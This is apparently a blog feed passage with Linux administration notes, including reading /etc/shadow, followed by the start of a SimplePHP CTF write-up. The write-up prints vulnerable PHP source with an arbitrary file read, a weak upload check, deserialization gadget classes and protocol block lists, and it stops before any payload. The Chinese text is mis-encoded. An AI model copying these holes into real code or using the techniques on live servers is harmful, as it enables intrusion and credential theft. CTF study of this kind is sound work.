//å¢åŠ ç”¨æˆ·</p><p>[root@o213 ~]# passwd admin  //ä¿®æ”¹adminçš„å¯†ç </p><p>[root@o213 ~]# passwd admin<br>æ›´æ”¹ç”¨æˆ· admin çš„å¯†ç  ã€‚<br>æ–°çš„å¯†ç ï¼š<br>é‡æ–°è¾“å…¥æ–°çš„å¯†ç ï¼š<br>passwdï¼šæ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚</p><p>[root@o213 ~]# usermod -L admin  é”å®šadminè´¦å·<br>[root@o213 ~]# userdel admin åˆ é™¤adminè´¦å·</p><p>ç”¨æˆ·çš„è´¦å·ä¿¡æ¯ä¿å­˜åœ¨ /etc/passwd  æ–‡ä»¶ä¸­</p><p>tail -1 /etc/passwd   //ä»åå¾€å‰æ˜¾ç¤ºä¸€è¡Œ</p><p>ç”¨æˆ·çš„åŠ å¯†å£ä»¤ä¿å­˜åœ¨ /etc/shadow  æ–‡ä»¶ä¸­</p><p>tail -1 /etc/shadow</p><p>ç”¨æˆ·çš„å®¿ä¸»ç›®å½•(å®¶ç›®å½•)åœ¨ /home ä¸‹</p><p>tail -1 /etc/home</p><p>åˆ‡æ¢ç”¨æˆ·</p><p>su admin  //åˆ‡æ¢åˆ°adminç”¨æˆ·</p><p>ç»„å‘½ä»¤ï¼š</p><p>groupadd  æ·»åŠ æŒ‡å®šåç§°çš„ç”¨æˆ·ç»„è´¦å·</p><p>groupdel  åˆ é™¤æŒ‡å®šåç§°çš„ç”¨æˆ·ç»„è´¦å·</p><p>æ–‡ä»¶</p><p>/etc/group  ä¿å­˜ç”¨æˆ·ç»„è´¦å·ä¿¡æ¯</p><pre><code>groupadd shuihugroupadd honglouuseradd -g shuihu wusong  //åˆ›å»ºwusongç”¨æˆ·å¹¶æŒ‡å®šåˆ°shuihuç»„useradd -g honglou jiabaoyu //åˆ›å»ºjiaobaoyuç»„å¹¶æŒ‡å®šåˆ°honglouç»„groupadd daxia usermod -g daxia wusong //å°†wusongè¿™ä¸ªç”¨æˆ·ä»shuihuç»„ç§»åˆ°daxiaç»„groupdel daxia  //åˆ é™¤ç»„</code></pre><p><img src="/2021/11/12/Linux/image-20211113001359900.png" alt="image-20211113001359900"></p><p><img src="/2021/11/12/Linux/image-20211113001715071.png" alt="image-20211113001715071"></p><p>å¢åŠ æ–‡ä»¶æ‰€æœ‰è€…çš„æ‰§è¡Œæƒé™</p><p>chmod u+x anaconda-ks.cfg  </p><p>å»é™¤æ–‡ä»¶æ‰€å±ç»„çš„å†™æƒé™</p><p>chmod g-w lshelp.txt</p><p>è®¾ç½®å…¶ä»–ç”¨æˆ·çš„æ–‡ä»¶æƒé™ä¸ºå¯æ‰§è¡Œ</p><p>chmod o=x lshelp.txt</p><p>è¿½åŠ æ‰€æœ‰è´¦å·æƒé™å¯è¯»</p><p>chmod a+r anaconda-ks.cfg</p><p>chownå‘½ä»¤ï¼š</p><p>è®¾ç½®æ–‡ä»¶çš„æ‰€ä»¥è€…ä¸ºwusongï¼Œè®©æ‰€å±ç»„ä¹Ÿè·Ÿç€æ”¹</p><p>chown wusong:lshelp.txt</p><p>è®¾ç½®æ–‡ä»¶çš„æ‰€ä»¥è€…ä¸ºrootï¼Œæ‰€å±ç»„ä¸æ”¹</p><p>chown root lshelp.txt</p><p>è®¾ç½®æ–‡ä»¶çš„æ‰€å±ç»„</p><p>chown : root lshelp.txt</p><p>æŸ¥çœ‹åŠåˆ‡æ¢ç›®å½•</p><p>pwdã€cdã€lsã€du</p><p>pwdï¼šæŸ¥çœ‹å·¥ä½œç›®å½•</p><p>[root@o213 ~]# pwd<br>/root</p><p>cdï¼šåˆ‡æ¢ç›®å½•</p><p>cd ~  å›å®¶</p><p>lsï¼šæ˜¾ç¤ºç›®å½•å†…å®¹</p><p>ls -l:ä»¥é•¿æ ¼å¼æ˜¾ç¤º</p><p>ls -a:æ˜¾ç¤ºæ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶</p><p>ls -A:ç±»ä¼¼äºâ€-aâ€,ä½†ä¸æ˜¾ç¤ºâ€.â€å’Œâ€..â€ç›®å½•çš„ä¿¡æ¯</p><p>ls -d:æ˜¾ç¤ºç›®å½•æœ¬èº«çš„å±æ€§</p><p>ls -h:ä»¥æ›´æ˜“è¯»çš„å­—èŠ‚å•ä½(Kã€Mç­‰)æ˜¾ç¤ºä¿¡æ¯</p><p>ls -R:é€’å½’æ˜¾ç¤ºå†…å®¹</p><p>ls â€“color:ä»¥é¢œè‰²åŒºåˆ†ä¸åŒç±»å‹æ–‡ä»¶</p><p>åˆ›å»ºç›®å½•å’Œæ–‡ä»¶</p><p>mkdirã€touchã€In</p><p>mkdir a/b/c/d  åˆ›å»ºå¤šå±‚ç›®å½• </p><p>touch aa.txt åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶</p><p>lnï¼šä¸ºæ–‡ä»¶æˆ–ç›®å½•å»ºç«‹é“¾æ¥</p><pre><code>[root@o213 ~]# ln -s /usr/bin/ls aa[root@o213 ~]# lsaa  anaconda-ks.cfgln lshelp.txt abc //å»ºç«‹ç¡¬é“¾æ¥</code></pre><p>ç¬¦å·é“¾æ¥ï¼šæŒ‡å‘åŸå§‹æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„ï¼Œåˆç§°ä¸ºè½¯é“¾æ¥</p><p>ç¡¬é“¾æ¥ï¼š</p><p>æŒ‡å‘åŸå§‹æ–‡ä»¶å¯¹åº”çš„æ•°æ®å­˜å‚¨ä½ç½®</p><p>ä¸èƒ½ä¸ºç›®å½•å»ºç«‹ç¡¬é“¾æ¥æ–‡ä»¶</p><p>ç¡¬é“¾æ¥ä¸åŸå§‹æ–‡ä»¶å¿…é¡»ä½äºåŒä¸€åˆ†åŒº(æ–‡ä»¶ç³»ç»Ÿ)</p><p>å¯ä»¥ä½¿ç”¨statå‘½ä»¤æŸ¥çœ‹ï¼š</p><pre><code>[root@o213 ~]# touch sakura.txt[root@o213 ~]# lsaa  anaconda-ks.cfg  sakura.txt[root@o213 ~]# ln sakura.txt dd[root@o213 ~]# state dd-bash: stateï¼šæœªæ‰¾åˆ°å‘½ä»¤[root@o213 ~]# stat dd  æ–‡ä»¶ï¼šdd  å¤§å°ï¼š0               å—ï¼š0          IO å—ï¼š4096   æ™®é€šç©ºæ–‡ä»¶è®¾å¤‡ï¼šfd00h/64768d      Inodeï¼š786445      ç¡¬é“¾æ¥ï¼š2æƒé™ï¼š(0644/-rw-r--r--)  Uidï¼š(    0/    root)   Gidï¼š(    0/    root)ç¯å¢ƒï¼šunconfined_u:object_r:admin_home_t:s0æœ€è¿‘è®¿é—®ï¼š2021-11-13 01:10:30.704162871 +0800æœ€è¿‘æ›´æ”¹ï¼š2021-11-13 01:10:30.704162871 +0800æœ€è¿‘æ”¹åŠ¨ï¼š2021-11-13 01:10:58.974385168 +0800åˆ›å»ºæ—¶é—´ï¼š2021-11-13 01:10:30.703162863 +0800[root@o213 ~]# stat sakura.txt  æ–‡ä»¶ï¼šsakura.txt  å¤§å°ï¼š0               å—ï¼š0          IO å—ï¼š4096   æ™®é€šç©ºæ–‡ä»¶è®¾å¤‡ï¼šfd00h/64768d      Inodeï¼š786445      ç¡¬é“¾æ¥ï¼š2æƒé™ï¼š(0644/-rw-r--r--)  Uidï¼š(    0/    root)   Gidï¼š(    0/    root)ç¯å¢ƒï¼šunconfined_u:object_r:admin_home_t:s0æœ€è¿‘è®¿é—®ï¼š2021-11-13 01:10:30.704162871 +0800æœ€è¿‘æ›´æ”¹ï¼š2021-11-13 01:10:30.704162871 +0800æœ€è¿‘æ”¹åŠ¨ï¼š2021-11-13 01:10:58.974385168 +0800åˆ›å»ºæ—¶é—´ï¼š2021-11-13 01:10:30.703162863 +0800</code></pre><p>å¤åˆ¶ã€åˆ é™¤ã€ç§»åŠ¨ç›®å½•å’Œæ–‡ä»¶</p><p>cpã€rmã€mv</p><p>cp: </p><p>-rï¼šé€’å½’å¤åˆ¶æ•´ä¸ªç›®å½•æ ‘</p><p>-p:ä¿æŒæºæ–‡ä»¶çš„å±æ€§ä¸å˜</p><p>-f:å¼ºåˆ¶è¦†ç›–ç›®æ ‡åŒåæ–‡ä»¶æˆ–ç›®å½•</p><p>-i:éœ€è¦è¦†ç›–æ–‡ä»¶æˆ–ç›®å½•æ—¶è¿›è¡Œæé†’</p><p>æŸ¥æ‰¾ç›®å½•å’Œæ–‡ä»¶</p><p>whichã€find</p><p>é€šé…ç¬¦ï¼š</p><p>*  ä»£æ›¿é›¶ä¸ªã€å•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</p><p>?  ä»£æ›¿ä¸€ä¸ªå­—ç¬¦</p><p>alias å®šä¹‰åˆ«åï¼š</p><p>alias myls=â€™ls -alhâ€™</p><p>du:</p><p>ç»Ÿè®¡ç›®å½•åŠæ–‡ä»¶çš„ç©ºé—´å ç”¨æ¸…ç©º</p><p>-a:ç»Ÿè®¡æ—¶åŒ…æ‹¬æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè€Œä¸ä»…ä»…åªç»Ÿè®¡ç›®å½•</p><p>-h:ä»¥æ›´å®¹è¯»çš„å­—èŠ‚å•ä½(Kã€Mç­‰)æ˜¾ç¤ºä¿¡æ¯</p><p>-s:åªç»Ÿè®¡æ¯ä¸ªå‚æ•°æ‰€å ç”¨ç©ºé—´çš„æ€»çš„å¤§å°</p><p>å¦‚ï¼š</p><p>du -sh /home/</p><pre><code>[root@o213 ~]# du -sh /home/60K     /home/</code></pre><p>find å‘½ä»¤</p><p>æ¯”å¦‚ï¼š</p><p>find /etc -name â€œre*.confâ€</p><p>ä»/etc ç›®å½•æ‰¾è¿™ä¸ªæ–‡ä»¶</p><p>-name:æŒ‰æ–‡ä»¶åç§°æŸ¥æ‰¾</p><p>-size:æŒ‰æ–‡ä»¶å¤§å°æŸ¥æ‰¾</p><p>-userï¼šæŒ‰æ–‡ä»¶å±ä¸»æŸ¥æ‰¾</p><p>-typeï¼šæŒ‰æ–‡ä»¶ç±»å‹æŸ¥æ‰¾</p><h1 id="ç¨‹åºå®‰è£…åŠç®¡ç†"><a href="#ç¨‹åºå®‰è£…åŠç®¡ç†" class="headerlink" title="ç¨‹åºå®‰è£…åŠç®¡ç†"></a>ç¨‹åºå®‰è£…åŠç®¡ç†</h1><p><img src="/2021/11/12/Linux/image-20211121230756940.png" alt="image-20211121230756940"></p><p><img src="/2021/11/12/Linux/image-20211121231009685.png" alt="image-20211121231009685"></p><p><img src="/2021/11/12/Linux/image-20211121231235005.png" alt="image-20211121231235005"></p><p><img src="/2021/11/12/Linux/image-20211121231510277.png" alt="image-20211121231510277"></p><p><img src="/2021/11/12/Linux/image-20211121232610276.png" alt="image-20211121232610276"></p><p><img src="/2021/11/12/Linux/image-20211121233634742.png" alt="image-20211121233634742"></p><p><img src="/2021/11/12/Linux/image-20211121233758176.png" alt="image-20211121233758176"></p><p><img src="/2021/11/12/Linux/image-20211121234948834.png" alt="image-20211121234948834"></p><p><img src="/2021/11/12/Linux/image-20211122000239414.png" alt="image-20211122000239414"></p><p><img src="/2021/11/12/Linux/image-20211122001630415.png" alt="image-20211122001630415"></p><h1 id="æ–‡æœ¬æ“ä½œå’Œvimç¼–è¾‘å™¨ä½¿ç”¨"><a href="#æ–‡æœ¬æ“ä½œå’Œvimç¼–è¾‘å™¨ä½¿ç”¨" class="headerlink" title="æ–‡æœ¬æ“ä½œå’Œvimç¼–è¾‘å™¨ä½¿ç”¨"></a>æ–‡æœ¬æ“ä½œå’Œvimç¼–è¾‘å™¨ä½¿ç”¨</h1><p><img src="/2021/11/12/Linux/image-20220308011741913.png" alt="image-20220308011741913"></p><p><img src="/2021/11/12/Linux/image-20220308013931204.png" alt="image-20220308013931204"></p><p><img src="/2021/11/12/Linux/image-20220308014033514.png" alt="image-20220308014033514"></p><p><img src="/2021/11/12/Linux/image-20220308014116929.png" alt="image-20220308014116929"></p><p><img src="/2021/11/12/Linux/image-20220308014233942.png" alt="image-20220308014233942"></p><p><img src="/2021/11/12/Linux/image-20220308014346074.png" alt="image-20220308014346074"></p><p><img src="/2021/11/12/Linux/image-20220308014736434.png" alt="image-20220308014736434"></p><p><img src="/2021/11/12/Linux/image-20220308015054899.png" alt="image-20220308015054899"></p><p><img src="/2021/11/12/Linux/image-20220308015347207.png" alt="image-20220308015347207"></p><p><img src="/2021/11/12/Linux/image-20220308015521810.png" alt="image-20220308015521810"></p><p><img src="/2021/11/12/Linux/image-20220308015748418.png" alt="image-20220308015748418"></p><p><img src="/2021/11/12/Linux/image-20220308015906926.png" alt="image-20220308015906926"></p><p><img src="/2021/11/12/Linux/image-20220308015952657.png" alt="image-20220308015952657"></p><p><img src="/2021/11/12/Linux/image-20220308020112384.png" alt="image-20220308020112384"></p><p><img src="/2021/11/12/Linux/image-20220308020212017.png" alt="image-20220308020212017"></p><h1 id="ç£ç›˜åŠæ–‡ä»¶ç³»ç»Ÿç®¡ç†"><a href="#ç£ç›˜åŠæ–‡ä»¶ç³»ç»Ÿç®¡ç†" class="headerlink" title="ç£ç›˜åŠæ–‡ä»¶ç³»ç»Ÿç®¡ç†"></a>ç£ç›˜åŠæ–‡ä»¶ç³»ç»Ÿç®¡ç†</h1><h2 id="ç£ç›˜"><a href="#ç£ç›˜" class="headerlink" title="ç£ç›˜"></a>ç£ç›˜</h2><p><img src="/2021/11/12/Linux/image-20220308141343118.png" alt="image-20220308141343118"></p><p><img src="/2021/11/12/Linux/image-20220308141518463.png" alt="image-20220308141518463"></p><p><img src="/2021/11/12/Linux/image-20220308141857925.png" alt="image-20220308141857925"></p><p><img src="/2021/11/12/Linux/image-20220308142045085.png" alt="image-20220308142045085"></p><h2 id="æ–‡ä»¶ç³»ç»Ÿç®¡ç†"><a href="#æ–‡ä»¶ç³»ç»Ÿç®¡ç†" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿç®¡ç†"></a>æ–‡ä»¶ç³»ç»Ÿç®¡ç†</h2><p><img src="/2021/11/12/Linux/image-20220308142954530.png" alt="image-20220308142954530"></p><p><img src="/2021/11/12/Linux/image-20220308143219045.png" alt="image-20220308143219045"></p><p><img src="/2021/11/12/Linux/image-20220308143403587.png" alt="image-20220308143403587"></p><p><img src="/2021/11/12/Linux/image-20220308143815646.png" alt="image-20220308143815646"></p><p><img src="/2021/11/12/Linux/image-20220308144414197.png" alt="image-20220308144414197"></p><p><img src="/2021/11/12/Linux/image-20220308144447054.png" alt="image-20220308144447054"></p><p><img src="/2021/11/12/Linux/image-20220308144514584.png" alt="image-20220308144514584"><img src="/2021/11/12/Linux/image-20220308152536146.png" alt="image-20220308152536146"></p><p><img src="/2021/11/12/Linux/image-20220308152716901.png" alt="image-20220308152716901"></p><h2 id="åˆ›å»ºåŠç®¡ç†LVMåˆ†åŒº"><a href="#åˆ›å»ºåŠç®¡ç†LVMåˆ†åŒº" class="headerlink" title="åˆ›å»ºåŠç®¡ç†LVMåˆ†åŒº"></a>åˆ›å»ºåŠç®¡ç†LVMåˆ†åŒº</h2><p><img src="/2021/11/12/Linux/image-20220308155422503.png" alt="image-20220308155422503"></p><p><img src="/2021/11/12/Linux/image-20220308155512004.png" alt="image-20220308155512004"></p><p><img src="/2021/11/12/Linux/image-20220308155636485.png" alt="image-20220308155636485"></p><p><img src="/2021/11/12/Linux/image-20220308160201334.png" alt="image-20220308160201334"></p><h2 id="ç£ç›˜é…é¢"><a href="#ç£ç›˜é…é¢" class="headerlink" title="ç£ç›˜é…é¢"></a>ç£ç›˜é…é¢</h2><p><img src="/2021/11/12/Linux/image-20220308160333556.png" alt="image-20220308160333556"></p><p><img src="/2021/11/12/Linux/image-20220308160444734.png" alt="image-20220308160444734"></p><p><img src="/2021/11/12/Linux/image-20220308160518732.png" alt="image-20220308160518732"></p><p><img src="/2021/11/12/Linux/image-20220308160855222.png" alt="image-20220308160855222"></p><p><img src="/2021/11/12/Linux/image-20220308161316439.png" alt="image-20220308161316439"></p><p><img src="/2021/11/12/Linux/image-20220308161526572.png" alt="image-20220308161526572"></p><p><img src="/2021/11/12/Linux/image-20220308161702971.png" alt="image-20220308161702971"></p><p><img src="/2021/11/12/Linux/image-20220308162017607.png" alt="image-20220308162017607"></p><p><img src="/2021/11/12/Linux/image-20220308162051869.png" alt="image-20220308162051869"></p><h1 id="ç³»ç»ŸæœåŠ¡ç®¡ç†"><a href="#ç³»ç»ŸæœåŠ¡ç®¡ç†" class="headerlink" title="ç³»ç»ŸæœåŠ¡ç®¡ç†"></a>ç³»ç»ŸæœåŠ¡ç®¡ç†</h1><h2 id="ç³»ç»ŸæœåŠ¡çš„æ¦‚è¿°"><a href="#ç³»ç»ŸæœåŠ¡çš„æ¦‚è¿°" class="headerlink" title="ç³»ç»ŸæœåŠ¡çš„æ¦‚è¿°"></a>ç³»ç»ŸæœåŠ¡çš„æ¦‚è¿°</h2><p><img src="/2021/11/12/Linux/image-20220309151533561.png" alt="image-20220309151533561"></p><p><img src="/2021/11/12/Linux/image-20220309151622437.png" alt="image-20220309151622437"></p><p><img src="/2021/11/12/Linux/image-20220309151811901.png" alt="image-20220309151811901"></p><p><img src="/2021/11/12/Linux/image-20220309151916312.png" alt="image-20220309151916312"></p><p><img src="/2021/11/12/Linux/image-20220309151949217.png" alt="image-20220309151949217"></p><p><img src="/2021/11/12/Linux/image-20220309152926717.png" alt="image-20220309152926717"></p><p><img src="/2021/11/12/Linux/image-20220309152956910.png" alt="image-20220309152956910"></p><p><img src="/2021/11/12/Linux/image-20220309153042821.png" alt="image-20220309153042821"></p><h2 id="ç®¡ç†ç³»ç»ŸæœåŠ¡"><a href="#ç®¡ç†ç³»ç»ŸæœåŠ¡" class="headerlink" title="ç®¡ç†ç³»ç»ŸæœåŠ¡"></a>ç®¡ç†ç³»ç»ŸæœåŠ¡</h2><p><img src="/2021/11/12/Linux/image-20220309153353958.png" alt="image-20220309153353958"></p><p><img src="/2021/11/12/Linux/image-20220309153524221.png" alt="image-20220309153524221"></p><p><img src="/2021/11/12/Linux/image-20220309160049784.png" alt="image-20220309160049784"></p><p><img src="/2021/11/12/Linux/image-20220309160311416.png" alt="image-20220309160311416"></p><p><img src="/2021/11/12/Linux/image-20220309160350364.png" alt="image-20220309160350364"></p><p><img src="/2021/11/12/Linux/image-20220309160421134.png" alt="image-20220309160421134"></p><h2 id="æ”¹å˜è¿è¡Œçº§åˆ«"><a href="#æ”¹å˜è¿è¡Œçº§åˆ«" class="headerlink" title="æ”¹å˜è¿è¡Œçº§åˆ«"></a>æ”¹å˜è¿è¡Œçº§åˆ«</h2><p><img src="/2021/11/12/Linux/image-20220309160525431.png" alt="image-20220309160525431"></p><p><img src="/2021/11/12/Linux/image-20220309160723356.png" alt="image-20220309160723356"></p><p><img src="/2021/11/12/Linux/image-20220309160828517.png" alt="image-20220309160828517"></p><h2 id="ä½¿ç”¨systemctl-å…³é—­æš‚åœå’Œä¼‘çœ ç³»ç»Ÿ"><a href="#ä½¿ç”¨systemctl-å…³é—­æš‚åœå’Œä¼‘çœ ç³»ç»Ÿ" class="headerlink" title="ä½¿ç”¨systemctl å…³é—­æš‚åœå’Œä¼‘çœ ç³»ç»Ÿ"></a>ä½¿ç”¨systemctl å…³é—­æš‚åœå’Œä¼‘çœ ç³»ç»Ÿ</h2><p><img src="/2021/11/12/Linux/image-20220309160944389.png" alt="image-20220309160944389"></p><p><img src="/2021/11/12/Linux/image-20220309161017524.png" alt="image-20220309161017524"></p><p><img src="/2021/11/12/Linux/image-20220309161025868.png" alt="image-20220309161025868"></p><p><img src="/2021/11/12/Linux/image-20220309161038493.png" alt="image-20220309161038493"></p><h1 id="Linuxè¿›ç¨‹åŠä»»åŠ¡è®¡åˆ’ç®¡ç†"><a href="#Linuxè¿›ç¨‹åŠä»»åŠ¡è®¡åˆ’ç®¡ç†" class="headerlink" title="Linuxè¿›ç¨‹åŠä»»åŠ¡è®¡åˆ’ç®¡ç†"></a>Linuxè¿›ç¨‹åŠä»»åŠ¡è®¡åˆ’ç®¡ç†</h1><p><img src="/2021/11/12/Linux/image-20220311104215174.png" alt="image-20220311104215174"></p><h2 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h2><p><img src="/2021/11/12/Linux/image-20220311104247963.png" alt="image-20220311104247963"></p><p><img src="/2021/11/12/Linux/image-20220311104518607.png" alt="image-20220311104518607"></p><p><img src="/2021/11/12/Linux/image-20220311104647148.png" alt="image-20220311104647148"></p><p><img src="/2021/11/12/Linux/image-20220311104829567.png" alt="image-20220311104829567"></p><p><img src="/2021/11/12/Linux/image-20220311105138731.png" alt="image-20220311105138731"></p><p><img src="/2021/11/12/Linux/image-20220311105442038.png" alt="image-20220311105442038"></p><p><img src="/2021/11/12/Linux/image-20220311105857725.png" alt="image-20220311105857725"></p><p><img src="/2021/11/12/Linux/image-20220311110031422.png" alt="image-20220311110031422"></p><p><img src="/2021/11/12/Linux/image-20220311110259860.png" alt="image-20220311110259860"></p><p><img src="/2021/11/12/Linux/image-20220311110723453.png" alt="image-20220311110723453"></p><p><img src="/2021/11/12/Linux/image-20220311113001852.png" alt="image-20220311113001852"></p><p><img src="/2021/11/12/Linux/image-20220311113153962.png" alt="image-20220311113153962"></p><p><img src="/2021/11/12/Linux/image-20220311113355591.png" alt="image-20220311113355591"></p><p><img src="/2021/11/12/Linux/image-20220311113757557.png" alt="image-20220311113757557"></p><h2 id="å­è¿›ç¨‹å’Œçº¿ç¨‹"><a href="#å­è¿›ç¨‹å’Œçº¿ç¨‹" class="headerlink" title="å­è¿›ç¨‹å’Œçº¿ç¨‹"></a>å­è¿›ç¨‹å’Œçº¿ç¨‹</h2><p><img src="/2021/11/12/Linux/image-20220311113844455.png" alt="image-20220311113844455"></p><p><img src="/2021/11/12/Linux/image-20220311114421066.png" alt="image-20220311114421066"></p><p><img src="/2021/11/12/Linux/image-20220311114814428.png" alt="image-20220311114814428"></p><p><img src="/2021/11/12/Linux/image-20220311114856523.png" alt="image-20220311114856523"></p><h2 id="ä»»åŠ¡è®¡åˆ’"><a href="#ä»»åŠ¡è®¡åˆ’" class="headerlink" title="ä»»åŠ¡è®¡åˆ’"></a>ä»»åŠ¡è®¡åˆ’</h2><p><img src="/2021/11/12/Linux/image-20220311115108093.png" alt="image-20220311115108093"></p><p><img src="/2021/11/12/Linux/image-20220311115303445.png" alt="image-20220311115303445"></p><p><img src="/2021/11/12/Linux/image-20220311115713093.png" alt="image-20220311115713093"></p><p><img src="/2021/11/12/Linux/image-20220311115808339.png" alt="image-20220311115808339"></p><p><img src="/2021/11/12/Linux/image-20220311115842074.png" alt="image-20220311115842074"></p><p><img src="/2021/11/12/Linux/image-20220311115932812.png" alt="image-20220311115932812"></p><p><img src="/2021/11/12/Linux/image-20220311115945371.png" alt="image-20220311115945371"></p><p><img src="/2021/11/12/Linux/image-20220311115955251.png" alt="image-20220311115955251"></p><p><img src="/2021/11/12/Linux/image-20220311120220267.png" alt="image-20220311120220267"></p><p><img src="/2021/11/12/Linux/image-20220311120246084.png" alt="image-20220311120246084"></p><p><img src="/2021/11/12/Linux/image-20220311120300762.png" alt="image-20220311120300762"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2018 SimplePHP_0x50-0x5F</title>
      <link href="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/"/>
      <url>/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/</url>
      
        <content type="html"><![CDATA[<p>å¦‚å›¾ï¼Œåªæœ‰ä¸¤ä¸ªåŠŸèƒ½ç‚¹ï¼ŒæŸ¥çœ‹æ–‡ä»¶å’Œä¸Šä¼ æ–‡ä»¶</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215628202.png" alt="image-20211107215628202"></p><p>ä¸Šä¼ æ–‡ä»¶åŠŸèƒ½ç‚¹åªèƒ½ä¸Šä¼ å›¾ç‰‡ã€‚</p><p>ç‚¹å‡»æŸ¥çœ‹é“¾æ¥è§‚å¯Ÿurl</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=</a></p><p>å°è¯•åœ¨fileååŠ ä¸€äº›ä¸œè¥¿</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php</a></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215818863.png" alt="image-20211107215818863"></p><p>surprise!</p><p>ç»§ç»­ï¼Œä¾æ¬¡è¯»å–å„ä¸ªé¡µé¢çš„æºç </p><p>file.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>function.php</p><pre><code class="php">&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;        &#125;public function __wakeup()&#123;    if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker~&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    